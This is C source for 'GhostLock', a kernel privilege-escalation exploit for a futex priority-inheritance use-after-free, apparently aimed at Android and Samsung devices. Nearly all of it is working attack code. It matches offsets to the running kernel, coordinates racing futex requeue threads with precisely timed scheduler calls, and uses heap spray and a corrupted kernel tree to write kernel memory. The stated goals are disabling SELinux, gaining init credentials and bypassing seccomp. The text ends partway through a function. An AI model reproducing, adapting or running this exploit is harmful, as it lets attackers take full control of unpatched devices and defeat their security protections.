/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * ksud late-load.
 */

#include "common.h"
#include "offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <poll.h>

const struct kernel_offsets *active_offsets = NULL;

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef ROOT_TASK_GROUP_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
  if (strcmp(uts.release, TARGET_KERNEL_RELEASE) != 0) {
    pr_error("build requires kernel %s, got %s\n",
             TARGET_KERNEL_RELEASE, uts.release);
    return -1;
  }
#endif
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      /* Publish the selected entry's init_cred image address. */
      g_init_cred_image = INIT_CRED;
      if (active_offsets->kernel_phys_load) {
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      }
      if (active_offsets->diagnostic_only) {
        pr_warning("diagnostic-only profile: physical mapping and exploit route unverified\n");
      } else {
        pr_info("init_cred image=%016zx alias=%016zx\n",
                (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
      }
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);
static int tracefs_tracing_on_read(void);
static int last_route_probe_page_touched;

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int owner_stop;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_inflight;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
static atomic_int controlled_pi_probe_active;
static atomic_int controlled_pi_owner_nice_applied;
_Atomic uint64_t gk_enter_ts;
atomic_int route_carrier_diagnostic_only;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  pr_info("route waiter tid=%d\n", tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
    futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  pr_info("waiter requeue_pi ret=%ld errno=%d\n", wait_ret, errno);
  if (active_offsets && active_offsets->rt_sigreturn_route)
    classic_sigreturn_phase();
  else
    do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pr_info("route owner tid=%ld\n", syscall(SYS_gettid));
  if (atomic_load(&controlled_pi_probe_active)) {
    errno = 0;
    int nice_before = getpriority(PRIO_PROCESS, 0);
    int before_errno = errno;
    errno = 0;
    int nice_ret = setpriority(PRIO_PROCESS, 0, 19);
    int nice_errno = errno;
    errno = 0;
    int nice_after = getpriority(PRIO_PROCESS, 0);
    int after_errno = errno;
    int applied = nice_ret == 0 && after_errno == 0 && nice_after == 19;
    atomic_store(&controlled_pi_owner_nice_applied, applied);
    pr_info("controlled PI owner nice before=%d before_errno=%d "
            "set_ret=%d set_errno=%d after=%d after_errno=%d applied=%d\n",
            nice_before, before_errno, nice_ret, nice_errno, nice_after,
            after_errno, applied);
  }
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  while (!atomic_load(&owner_stop)) sleep(1);
  if (lock_target == 0)
    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pr_info("route consumer tid=%ld\n", syscall(SYS_gettid));
  int sync_route_enabled = active_offsets &&
                           (active_offsets->sync_route ||
                            active_offsets->rt_sigreturn_route);
  int max_calls = (active_offsets && active_offsets->consumer_max_calls)
                    ? active_offsets->consumer_max_calls
                    : CONSUMER_MAX_CALLS;
  int call_interval_usec = active_offsets
    ? active_offsets->consumer_call_interval_usec : 0;
  if (active_offsets && active_offsets->consumer_core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(active_offsets->consumer_core, &cpuset);
    if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
      pin_to_core(CONSUMER_CORE);
    }
  } else {
    pin_to_core(CONSUMER_CORE);
  }
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    if (sync_route_enabled) {
      if (active_offsets->rt_sigreturn_route) {
        if (!rt_sigreturn_fault_consumer_window()) {
          pr_info("rt_sigreturn consumer did not observe parser page\n");
          atomic_store(&punch_consume_go, 0);
          continue;
        }
        if (atomic_load_explicit(&route_carrier_diagnostic_only,
                                 memory_order_acquire)) {
          /* The signal carrier and its post-copy consumer window have been
           * observed.  Deliberately stop before sched_setattr(), so
           * this command can never enter the forged PI tree or write memory. */
          pr_success("rt_sigreturn carrier window observed; scheduler punch skipped\n");
          atomic_fetch_add(&consumer_calls, 1);
          atomic_fetch_add(&consumer_success, 1);
          atomic_store(&punch_consume_go, 0);
          continue;
        }
      } else {
        /* Use one precisely-timed fire: anchor at the pselect entry
         * timestamp, sleep to ~1ms before the mark, busy-wait the last
         * ~2ms.  Repeated firing on the corrupted rb tree risks a
         * hardlockup, so exactly one punch per route. */
        int delay_usec = atomic_load(&main_route_delay_usec);
        uint64_t enter = 0;
        while (!(enter = atomic_load(&gk_enter_ts))) {
          if (atomic_load(&punch_consume_stop) ||
              atomic_load(&punch_consume_go) != seq) break;
          __asm__ volatile("yield" ::: "memory");
        }
        if (!enter) continue;
        uint64_t target = enter + (uint64_t)delay_usec * 1000ULL;
        for (;;) {
          if (atomic_load(&punch_consume_stop) ||
              atomic_load(&punch_consume_go) != seq) break;
          uint64_t now = mono_ns();
          if (now >= target) break;
          uint64_t rem = target - now;
          if (rem < 1999489ULL) {
            __asm__ volatile("yield" ::: "memory");
            continue;
          }
          usleep((useconds_t)((rem - 1000000ULL) / 1000ULL));
        }
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) continue;
      }
      atomic_fetch_add(&consumer_calls, 1);
      int rt_inflight_before = active_offsets->rt_sigreturn_route
                                 ? rt_sigreturn_fault_inflight_state() : -1;
      errno = 0;
      int target_nice_before = getpriority(PRIO_PROCESS, tid);
      int target_nice_before_errno = errno;
      errno = 0;
      long sched_ret = active_offsets->rt_sigreturn_route
          ? sched_setattr_tid(tid, RTSIG_CONSUMER_NICE)
          : sched_setattr_tid(tid,
                              (atomic_load(&consumer_calls) % 19) + 1);
      int sched_errno = errno;
      errno = 0;
      int target_nice_after = getpriority(PRIO_PROCESS, tid);
      int target_nice_after_errno = errno;
      int rt_inflight_after = active_offsets->rt_sigreturn_route
                                ? rt_sigreturn_fault_inflight_state() : -1;
      if (active_offsets->rt_sigreturn_route) {
        pr_info("rt_sigreturn punch ret=%ld errno=%d inflight=%d/%d "
                "tail_refault=%d window_guard=%d target_nice=%d/%d "
                "nice_errno=%d/%d\n",
                sched_ret, sched_errno,
                rt_inflight_before, rt_inflight_after,
                rt_sigreturn_fault_tail_refault_state(),
                rt_sigreturn_fault_wchan_state(),
                target_nice_before, target_nice_after,
                target_nice_before_errno, target_nice_after_errno);
      }
      if (sched_ret == 0) {
        atomic_fetch_add(&consumer_success, 1);
      } else {
        pr_info("sync punch sched_setattr failed errno=%d\n", errno);
      }
      atomic_store(&punch_consume_go, 0);
      continue;
    }
    int calls_this_seq = 0;
    int delay_usec = atomic_load(&main_route_delay_usec);
    if (delay_usec > 0) usleep((useconds_t)delay_usec);
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        atomic_store(&consumer_inflight, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        int sched_errno = errno;
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          errno = 0;
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          int futex_errno = errno;
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          } else if (calls_this_seq == 0) {
            pr_info("consumer sched_setattr failed errno=%d; "
                    "futex fallback failed errno=%d\n",
                    sched_errno, futex_errno);
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        atomic_store(&consumer_inflight, 0);
        calls_this_seq++;
        if (calls_this_seq >= max_calls) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
        if (call_interval_usec) usleep((useconds_t)call_interval_usec);
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&owner_stop, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0; cfi_last_errno = 0;
}

int run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  long requeue_ret =
    futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  pr_info("route cmp_requeue_pi ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  while (!atomic_load(&route_done)) usleep(5000);

  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);

  return atomic_load(&consumer_calls) > 0 &&
         atomic_load(&consumer_success) > 0 && cfi_last_step == 0;
}

/* ------------------------------------------------------------------ */
/* EDEADLK-synchronized route (Samsung 6.1): three-thread handshake with a
 * precisely timed sched_setattr operation.                            */
/* ------------------------------------------------------------------ */

atomic_int gk_pselect_entered, gk_route_done, gk_window_hit, gk_fire_success;
static atomic_int gk_t3_ready, gk_t1_holds_a, gk_t2_positioned;
static atomic_int gk_t1_about_wait, gk_t1_done, gk_t1_timeout;
static atomic_int gk_edeadlk, gk_release, gk_owner_has_lock;
static atomic_int gk_waiter_tid, gk_fire_count;

static void *sync_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  atomic_store(&gk_waiter_tid, (int)syscall(SYS_gettid));
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("sync waiter lock chain errno=%d\n", errno);
  atomic_store(&gk_t1_holds_a, 1);
  while (!atomic_load(&gk_t2_positioned)) usleep(1000);
  atomic_store(&gk_t1_about_wait, 1);

  /* FUTEX_WAIT_REQUEUE_PI takes an ABSOLUTE CLOCK_MONOTONIC timeout —
   * The route uses now+50ms (including the 950ms normalization).
   * A relative-looking {1,0} is 1s after boot: long expired, the waiter
   * returns instantly and the requeue never sees it. */
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  ts.tv_nsec += 50000000L;
  if (ts.tv_nsec >= 950000000L) {
    ts.tv_sec++;
    ts.tv_nsec -= 950000000L;
  }
  errno = 0;
  long r = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
  int wait_errno = errno;
  pr_info("sync waiter wait_requeue_pi ret=%ld errno=%d\n", r, wait_errno);
  if (r == 0 || wait_errno != ETIMEDOUT) {
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&gk_t1_done, 1);
    return NULL;
  }
  atomic_store(&gk_t1_timeout, 1);
  while (!atomic_load(&gk_edeadlk) && !atomic_load(&gk_release))
    __asm__ volatile("yield" ::: "memory");
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  if (atomic_load(&gk_release)) {
    atomic_store(&gk_t1_done, 1);
    return NULL;
  }
  while (!atomic_load(&gk_owner_has_lock) && !atomic_load(&gk_release))
    __asm__ volatile("yield" ::: "memory");
  if (atomic_load(&gk_release)) {
    atomic_store(&gk_t1_done, 1);
    return NULL;
  }
  pr_info("sync waiter overwrite begin owner=%d entered=%d route=%d backend=%s\n",
          atomic_load(&gk_owner_has_lock),
          atomic_load(&gk_pselect_entered), atomic_load(&gk_route_done),
          active_offsets->rt_sigreturn_route ? "rt_sigreturn" : "pselect");
  if (active_offsets->rt_sigreturn_route) sync_sigreturn_phase();
  else sync_pselect_phase();
  pr_info("sync waiter overwrite end route=%d hit=%d step=%d errno=%d\n",
          atomic_load(&gk_route_done), atomic_load(&gk_window_hit),
          cfi_last_step, cfi_last_errno);
  atomic_store(&gk_t1_done, 1);
  while (!atomic_load(&gk_release)) usleep(10000);
  return NULL;
}

static void *sync_owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("sync owner lock target errno=%d\n", errno);
  while (!atomic_load(&gk_t1_holds_a)) usleep(1000);
  atomic_store(&gk_t2_positioned, 1);
  errno = 0;
  long chain_ret = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  pr_info("sync owner chain lock ret=%ld errno=%d\n", chain_ret, errno);
  atomic_store(&gk_owner_has_lock, 1);
  while (!atomic_load(&gk_release)) usleep(1000);
  return NULL; /* the owner remains held until the route is released */
}

static void *sync_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  /* Pin this pselect consumer to CPU2.  CPU1 changes the PI handoff timing
   * enough to make the single sched_setattr operation intermittently reboot
   * the device. */
  int consumer_core = (active_offsets && active_offsets->consumer_core)
                        ? active_offsets->consumer_core : 2;
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(consumer_core, &cpuset);
  if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
    pr_warning("sync consumer sched_setaffinity cpu=%d failed errno=%d\n",
               consumer_core, errno);
  }
  atomic_store(&gk_t3_ready, 1);
  int fire_once = 0;
  for (;;) {
    if (!(atomic_load(&gk_pselect_entered) && !fire_once)) {
      if (atomic_load(&gk_route_done)) return NULL;
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    int delay_usec = atomic_load(&main_route_delay_usec);
    uint64_t enter = 0;
    while (!(enter = atomic_load(&gk_enter_ts))) {
      if (atomic_load(&gk_route_done)) return NULL;
      __asm__ volatile("yield" ::: "memory");
    }
    uint64_t target = enter + (uint64_t)delay_usec * 1000ULL;
    /* Sleep to 1ms before the mark, then busy-wait the last ~2ms. */
    for (;;) {
      if (atomic_load(&gk_route_done)) return NULL;
      uint64_t now = mono_ns();
      if (now >= target) break;
      uint64_t rem = target - now;
      if (rem < 2000001ULL) {
        __asm__ volatile("yield" ::: "memory");
        continue;
      }
      usleep((useconds_t)((rem - 1000000ULL) / 1000ULL));
    }
    int n = atomic_fetch_add(&gk_fire_count, 1);
    int tid = atomic_load(&gk_waiter_tid);
    uint64_t punch_now = mono_ns();
    int64_t punch_delta_ns = (int64_t)(punch_now - target);
    pr_info("sync punch begin n=%d tid=%d now=%llu target=%llu "
            "delta_ns=%lld delay_us=%d\n",
            n, tid, (unsigned long long)punch_now,
            (unsigned long long)target, (long long)punch_delta_ns, delay_usec);
    errno = 0;
    long r = sched_setattr_tid(tid, (n % 19) + 1);
    int punch_errno = errno;
    pr_info("sync punch end n=%d ret=%ld errno=%d fire=%d\n",
            n, r, punch_errno, atomic_load(&gk_fire_success));
    if (r != 0) {
      pr_info("sync punch sched_setattr failed errno=%d\n", punch_errno);
    } else {
      atomic_fetch_add(&gk_fire_success, 1);
    }
    atomic_store(&gk_route_done, 1);
    fire_once = 1;
  }
}

static int sync_delay_override(void) {
  const char *text = getenv("FOPS_DELAY_USEC");
  if (text == NULL || text[0] == '\0') {
    return -1;
  }

  char *end = NULL;
  errno = 0;
  long value = strtol(text, &end, 0);
  if (errno != 0 || end == text || *end != '\0' || value < 0 ||
      value > 1000000) {
    pr_warning("sync invalid FOPS_DELAY_USEC=%s; using rotation\n", text);
    return -1;
  }
  return (int)value;
}

static int sync_next_persistent_delay_index(int count) {
  static const char state_path[] =
      "/data/local/tmp/.ghostlock_fops_delay_index";
  int state_fd = open(state_path, O_RDWR | O_CREAT | O_CLOEXEC, 0600);
  if (state_fd < 0) {
    return -1;
  }

  uint8_t stored = 0;
  ssize_t read_len = pread(state_fd, &stored, sizeof(stored), 0);
  int index = (read_len == (ssize_t)sizeof(stored) && stored < count)
                  ? (int)stored
                  : 0;
  uint8_t next = (uint8_t)((index + 1) % count);
  ssize_t write_len = pwrite(state_fd, &next, sizeof(next), 0);
  int write_errno = errno;
  errno = 0;
  int sync_ret = fsync(state_fd);
  int sync_errno = errno;
  close(state_fd);
  if (write_len != (ssize_t)sizeof(next)) {
    pr_warning("sync delay index state write failed ret=%zd errno=%d\n",
               write_len, write_errno);
    return -1;
  }
  if (sync_ret != 0) {
    pr_warning("sync delay index state fsync failed ret=%d errno=%d\n",
               sync_ret, sync_errno);
  }
  return index;
}

int run_sync_route(void) {
  reset_main_route_state();
  atomic_store(&gk_pselect_entered, 0);
  atomic_store(&gk_route_done, 0);
  atomic_store(&gk_window_hit, 0);
  atomic_store(&gk_fire_success, 0);
  atomic_store(&gk_t3_ready, 0);
  atomic_store(&gk_t1_holds_a, 0);
  atomic_store(&gk_t2_positioned, 0);
  atomic_store(&gk_t1_about_wait, 0);
  atomic_store(&gk_t1_done, 0);
  atomic_store(&gk_t1_timeout, 0);
  atomic_store(&gk_edeadlk, 0);
  atomic_store(&gk_release, 0);
  atomic_store(&gk_owner_has_lock, 0);
  atomic_store(&gk_waiter_tid, 0);
  atomic_store(&gk_fire_count, 0);
  atomic_store(&gk_enter_ts, 0);

  /* Allow one delay to be selected externally while retaining the normal
   * per-route rotation when the variable is absent. */
  static const int fops_delays[] = {
    70000, 60000, 80000, 40000, 90000, 50000,
  };
  int delay_count = (int)(sizeof(fops_delays) / sizeof(fops_delays[0]));
  static int sync_route_counter;
  int delay_override = active_offsets->rt_sigreturn_route
                           ? 0 : sync_delay_override();
  int delay_index = -1;
  const char *delay_source = "rotation";
  int route_delay = delay_override;
  if (active_offsets->rt_sigreturn_route) {
    delay_index = 0;
    delay_source = "rt_sigreturn";
  } else if (delay_override >= 0) {
    delay_index = sync_route_counter++ % delay_count;
    delay_source = "env";
  } else {
    delay_index = sync_next_persistent_delay_index(delay_count);
    if (delay_index >= 0) {
      delay_source = "persistent";
    } else {
      delay_index = sync_route_counter++ % delay_count;
    }
    route_delay = fops_delays[delay_index];
  }
  atomic_store(&main_route_delay_usec, route_delay);
  pr_info("sync route delay=%dus source=%s index=%d\n", route_delay,
          delay_source, delay_index);

  pthread_t waiter, owner, consumer;
  int waiter_rc = pthread_create(&waiter, NULL, sync_waiter_thread, NULL);
  if (waiter_rc != 0)
    pr_error("sync waiter thread create failed rc=%d\n", waiter_rc);
  int owner_rc = pthread_create(&owner, NULL, sync_owner_thread, NULL);
  if (owner_rc != 0)
    pr_error("sync owner thread create failed rc=%d\n", owner_rc);
  int consumer_rc = pthread_create(&consumer, NULL, sync_consumer_thread, NULL);
  if (consumer_rc != 0)
    pr_error("sync consumer thread create failed rc=%d\n", consumer_rc);

  while (!atomic_load(&gk_t1_about_wait) || !atomic_load(&gk_t2_positioned) ||
         !atomic_load(&gk_t3_ready)) {
    usleep(1000);
  }

  int ok = 0;
  long last_r = -2;
  int last_errno = -2;
  for (int i = 1000;;) {
    errno = 0;
    long r = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                      &f_pi_target, 0);
    int requeue_errno = errno;
    if (r != last_r || requeue_errno != last_errno) {
      pr_info("sync requeue i=%d ret=%ld errno=%d\n", 1001 - i, r,
              requeue_errno);
      last_r = r;
      last_errno = requeue_errno;
    }
    if (r > 0) break; /* plain wake = route not established */
    if (r == 0) {     /* nobody queued yet */
      if (i == 1) break;
      usleep(1000);
      i--;
      continue;
    }
    if (requeue_errno != EDEADLK) break;
    /* EDEADLK is only the route handoff signal, not proof of a live PI chain.
     * Let the waiter proceed to the controlled-page validation. */
    pr_info("sync route EDEADLK handoff waiter_done=%d owner_lock=%d\n",
            atomic_load(&gk_t1_done), atomic_load(&gk_owner_has_lock));
    atomic_store(&gk_edeadlk, 1);
    while (!atomic_load(&gk_t1_done)) usleep(1000);
    pr_info("sync route waiter done timeout=%d window=%d step=%d errno=%d\n",
            atomic_load(&gk_t1_timeout), atomic_load(&gk_window_hit),
            cfi_last_step, cfi_last_errno);
    ok = atomic_load(&gk_t1_timeout) && atomic_load(&gk_window_hit) &&
         cfi_last_step == 0;
    break;
  }
  pr_info("sync route done ok=%d timeout_path=%d hit=%d step=%d\n",
          ok, atomic_load(&gk_t1_timeout), atomic_load(&gk_window_hit),
          cfi_last_step);
  atomic_store(&gk_release, 1);
  atomic_store(&gk_route_done, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);
  return ok;
}

static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
  last_route_probe_page_touched = 0;
  pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
  if (active_offsets && active_offsets->rt_sigreturn_route &&
      access("/sdcard/Download", R_OK | W_OK) != 0) {
    /* The G985F carrier needs emulated-storage FUSE to hold the post-copy
     * page fault open long enough for the single scheduler callback.  The
     * ext4 fallback is useful for harmless self-tests but is too short for a
     * verified write.  Fail before allocator pressure when user 0 is locked. */
    pr_warning("G985F route requires unlocked /sdcard/Download errno=%d\n",
               errno);
    return 0;
  }
  /* leaf=1 uses the "write 0" payload (fake_right=0). __rb_erase_augmented()
   * case 1 then makes __rb_change_child() write parent->rb_right (= target)
   * with the erased node's rb_right value: fake_left is always NULL so case 1
   * always fires, and the erased node is RED so no color fixup runs. */
  pselect_child_node = leaf ? 0 : 1;
  set_pselect_write_mode(target, 0, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  int routed = active_offsets->sync_route ? run_sync_route()
                                          : run_main_route_threads();
  TIMER("  PI route done");
  if (active_offsets && active_offsets->rt_sigreturn_route &&
      (mode == 1 || mode == RTSIG_CONTROLLED_PI_PROBE_MODE) && leaf == 1) {
    int page_touched = route_probe_payload_readback();
    last_route_probe_page_touched = page_touched;
    pr_info("route-probe controlled-page waiter-reprio=%d\n", page_touched);
  }
  clear_pselect_write();
  if (!routed) {
    pr_warning("  PI route did not produce a verified write\n");
  }
  return routed;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) {
    /* untrusted_app often cannot read enforce while SELinux is enforcing. */
    return 0;
  }
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int enforce_readable(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) return 0;
  close(efd);
  return 1;
}

static int process_has_seccomp(void) {
  /* The app flow runs inside zygote, whose seccomp filter blocks
   * finit_module(2). The adb/shell flow has no filter (Seccomp: 0), and
   * fork() inherits that, so the W2 child does not need W3 there. */
  FILE *status = fopen("/proc/self/status", "r");
  if (!status) return 0;
  char line[256];
  int seccomp = 0;
  while (fgets(line, sizeof(line), status)) {
    if (strncmp(line, "Seccomp:", 8) == 0) {
      seccomp = atoi(line + 8);
      break;
    }
  }
  fclose(status);
  return seccomp != 0;
}

static void slab_drain(void) {
  /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
   * (exit 137) especially right before heap spray. */
